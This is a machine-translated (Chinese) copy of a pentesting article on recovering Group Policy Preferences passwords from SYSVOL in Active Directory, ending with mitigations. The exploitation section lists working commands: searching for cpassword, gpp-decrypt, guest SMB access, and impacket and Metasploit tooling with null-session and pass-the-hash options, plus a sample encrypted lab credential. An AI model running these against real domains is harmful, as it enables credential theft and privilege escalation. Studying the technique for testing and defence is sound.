<html>
<head>
<title>Attacking GPP(Group Policy Preferences) Credentials | Active Directory Pentesting</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">攻击GPP(组策略首选项)凭据| Active Directory测试</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/attacking-gpp-group-policy-preferences-credentials-active-directory-pentesting-16d9a65fa01a?source=collection_archive---------1-----------------------#2022-09-06">https://infosecwriteups.com/attacking-gpp-group-policy-preferences-credentials-active-directory-pentesting-16d9a65fa01a?source=collection_archive---------1-----------------------#2022-09-06</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="ce02" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="kl">一种非常常见且</em>容易的攻击，提供存储在SYSVOL共享中的用户凭证，可用于获取外壳或提升权限<em class="kl">。</em></p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi km"><img src="../Images/fb3f6874aff179789f3b4f1e8473988f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ICRlnVAiuNqcrRrO-YXG2g.png"/></div></div></figure><h2 id="b9d5" class="ky kz iq bd la lb lc dn ld le lf dp lg jy lh li lj kc lk ll lm kg ln lo lp lq bi translated">背景:</h2><p id="7422" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">组策略首选项(GPP)允许管理员创建带有嵌入式凭据的域策略。等等，GPP是什么？</p><blockquote class="lw lx ly"><p id="b50b" class="jn jo kl jp b jq jr js jt ju jv jw jx lz jz ka kb ma kd ke kf mb kh ki kj kk ij bi translated">组策略首选项是组策略客户端扩展的集合，这些扩展向运行Microsoft Windows桌面和服务器操作系统的加入域的计算机提供首选项设置。</p></blockquote><p id="f1f0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">简而言之，GPP是一种工具，它为管理员提供了一些高级功能，用于在Windows域网络中配置和管理帐户策略。</p><p id="6a18" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这些策略允许他们设置本地帐户，并为各种目的嵌入凭据，否则可能需要在脚本中嵌入密码。因此，当生成新的组策略首选项(GPP)时，会在SYSVOL共享中创建一个包含配置数据的xml文件(通常为Groups.xml ),包括与GPP关联的任何密码，SYSVOL共享是域控制器上的文件夹，所有经过身份验证的域用户都可以访问和读取这些文件夹。</p><p id="9800" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">出于保护目的，微软在将密码存储为“cpassword”之前，会使用AES对其进行加密。但是钥匙可以在<a class="ae mc" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be" rel="noopener ugc nofollow" target="_blank"> MSDN </a>上公开获得！</p><p id="e845" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">域组策略存储在:</p><pre class="kn ko kp kq gt md me mf mg aw mh bi"><span id="91c3" class="ky kz iq me b gy mi mj l mk ml">\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</span></pre><p id="90f1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">存储在XML文件中的cpassword如下所示:</p><pre class="kn ko kp kq gt md me mf mg aw mh bi"><span id="26a1" class="ky kz iq me b gy mi mj l mk ml">└─$ cat Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml</span><span id="ddfb" class="ky kz iq me b gy mm mj l mk ml">...<br/>D9BDE98BA1D1}" name="<strong class="me ir">active.htb\SVC_TGS</strong>" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"&gt;&lt;Properties action="U" newName="" fullName="" description="" <strong class="me ir">cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"</strong> changeLogon="0" noChange="1" <br/>...</span></pre><p id="276f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，在某些情况下，我们可以读取这些文件:</p><ul class=""><li id="1356" class="mn mo iq jp b jq jr ju jv jy mp kc mq kg mr kk ms mt mu mv bi translated">我们在系统上已经有了一个低特权shell，所以我们可以在SYSVOL共享中搜索XML文件。</li><li id="8dc7" class="mn mo iq jp b jq mw ju mx jy my kc mz kg na kk ms mt mu mv bi translated">由于允许来宾访问，我们能够匿名访问SMB文件共享(无需任何密码),并且该共享托管了XML文件。</li><li id="9df0" class="mn mo iq jp b jq mw ju mx jy my kc mz kg na kk ms mt mu mv bi translated">暴露或允许访问XML文件任何其他漏洞。</li></ul><p id="b07e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">受影响的系统:</strong></p><p id="7a6f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">微软在这里列出了受影响的系统<a class="ae mc" href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025#affected-and-non-affected-software" rel="noopener ugc nofollow" target="_blank">。</a></p><h2 id="b090" class="ky kz iq bd la lb lc dn ld le lf dp lg jy lh li lj kc lk ll lm kg ln lo lp lq bi translated">剥削:</h2><p id="07ee" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">有许多方法可以找到并轻松解密密码，例如:</p><ol class=""><li id="3f41" class="mn mo iq jp b jq jr ju jv jy mp kc mq kg mr kk nb mt mu mv bi translated">如果我们已经有了<strong class="jp ir"> shell访问</strong>，那么我们可以搜索字符串，因为关键字“cpassword”的值等于密码:</li></ol><pre class="kn ko kp kq gt md me mf mg aw mh bi"><span id="7a88" class="ky kz iq me b gy mi mj l mk ml">findstr /S /I cpassword \\&lt;DOMAIN&gt;\sysvol\&lt;DOMAIN&gt;\policies\*.xml</span></pre><p id="be17" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后使用kali工具对其进行解密，以获得明文密码，该密码稍后可用于提升权限:</p><pre class="kn ko kp kq gt md me mf mg aw mh bi"><span id="d1db" class="ky kz iq me b gy mi mj l mk ml">gpp-decrypt &lt;hash&gt;</span></pre><p id="3ed1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2.如果允许我们作为来宾连接到任何共享，那么我们可以从SYSVOL上的文件中找到cpassword值，并将它们传递给gpp-decrypt:</p><pre class="kn ko kp kq gt md me mf mg aw mh bi"><span id="d60a" class="ky kz iq me b gy mi mj l mk ml">$ smbclient \\\\ip_address\\share</span><span id="45f8" class="ky kz iq me b gy mm mj l mk ml">&gt; mget * (to list all the files including policies)</span></pre><p id="bf4a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">3.使用impacket模块<a class="ae mc" href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/Get-GPPPassword.py" rel="noopener ugc nofollow" target="_blank"> Get-GPPPassword.py </a>搜索并转储密码:</p><pre class="kn ko kp kq gt md me mf mg aw mh bi"><span id="d7b3" class="ky kz iq me b gy mi mj l mk ml">#with a NULL session<br/>Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'</span><span id="2823" class="ky kz iq me b gy mm mj l mk ml">#with cleartext credentials<br/>Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'</span><span id="48b5" class="ky kz iq me b gy mm mj l mk ml">#pass the hash(with an NT hash)<br/>Get-GPPPassword.py -hashes :'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'</span><span id="036e" class="ky kz iq me b gy mm mj l mk ml">#parse a local file<br/>Get-GPPPassword.py -xmlfile '/path/to/Policy.xml' 'LOCAL'</span></pre><p id="0173" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">4.使用powersploit模块<a class="ae mc" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1" rel="noopener ugc nofollow" target="_blank"> Get-GPPPassword.ps1 </a>或Metasploit模块'<em class="kl">辅助/扫描仪/smb/smb_enum_gpp' </em>或'<em class="kl">post/windows/gather/credentials/GPP '</em>自动查找并获取明文密码。</p><h2 id="f9b1" class="ky kz iq bd la lb lc dn ld le lf dp lg jy lh li lj kc lk ll lm kg ln lo lp lq bi translated">缓解措施:</h2><ul class=""><li id="0832" class="mn mo iq jp b jq lr ju ls jy nc kc nd kg ne kk ms mt mu mv bi translated">在每台计算机上安装MS14–025中所述的<a class="ae mc" href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2014/ms14-025" rel="noopener ugc nofollow" target="_blank"> KB2962486 </a>，用于防止新凭证被添加到组策略首选项中。</li><li id="3cf3" class="mn mo iq jp b jq mw ju mx jy my kc mz kg na kk ms mt mu mv bi translated">删除SYSVOL中任何包含密码的现有GPP xml文件。</li><li id="da65" class="mn mo iq jp b jq mw ju mx jy my kc mz kg na kk ms mt mu mv bi translated">密码不应存储在所有经过身份验证的用户都可以使用的文件中。</li></ul></div><div class="ab cl nf ng hu nh" role="separator"><span class="ni bw bk nj nk nl"/><span class="ni bw bk nj nk nl"/><span class="ni bw bk nj nk"/></div><div class="ij ik il im in"><p id="de25" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">非常感谢您的阅读。在<a class="ae mc" href="https://twitter.com/jaiguptanick" rel="noopener ugc nofollow" target="_blank"> Twitter </a>、<a class="ae mc" href="https://www.linkedin.com/in/jaiguptanick/" rel="noopener ugc nofollow" target="_blank"> Linkedin </a>、<a class="ae mc" href="https://www.youtube.com/channel/UCGvgjzkWyrYaTzJsDlTGB9g" rel="noopener ugc nofollow" target="_blank"> Youtube </a>上与我联系。</p><p id="91fd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="kl">参考文献:</em></p><ul class=""><li id="227e" class="mn mo iq jp b jq jr ju jv jy mp kc mq kg mr kk ms mt mu mv bi translated"><a class="ae mc" href="https://adsecurity.org/?p=2288" rel="noopener ugc nofollow" target="_blank">https://adsecurity.org/?p=2288</a></li><li id="7075" class="mn mo iq jp b jq mw ju mx jy my kc mz kg na kk ms mt mu mv bi translated"><a class="ae mc" href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn581922(v=ws.11)" rel="noopener ugc nofollow" target="_blank">https://docs . Microsoft . com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn 581922(v = ws . 11)</a></li><li id="34d7" class="mn mo iq jp b jq mw ju mx jy my kc mz kg na kk ms mt mu mv bi translated"><a class="ae mc" href="https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/" rel="noopener ugc nofollow" target="_blank">https://www . rapid 7 . com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pw nage/</a></li></ul></div><div class="ab cl nf ng hu nh" role="separator"><span class="ni bw bk nj nk nl"/><span class="ni bw bk nj nk nl"/><span class="ni bw bk nj nk"/></div><div class="ij ik il im in"><h2 id="5c68" class="ky kz iq bd la lb lc dn ld le lf dp lg jy lh li lj kc lk ll lm kg ln lo lp lq bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae mc" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个Github Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>